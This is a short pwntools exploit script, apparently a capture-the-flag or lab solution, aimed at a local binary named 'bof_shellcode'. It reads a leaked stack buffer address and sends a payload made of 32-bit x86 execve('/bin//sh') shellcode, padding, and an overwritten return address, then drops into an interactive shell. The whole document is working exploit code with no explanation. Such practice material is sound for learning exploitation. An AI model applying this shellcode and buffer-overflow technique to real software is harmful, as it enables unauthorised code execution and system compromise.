from pwn import *
	
context.log_level = 'debug'

p = process('./bof_shellcode')
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" #25bytes
#gdb.attach(p)

p.recvuntil("Address of buf : ")
buf = p32(int(p.recv(10), 16))


payload = shellcode 
payload += b'a' * 27
payload += b'b' * 4
payload += buf



p.send(payload)

p.interactive()


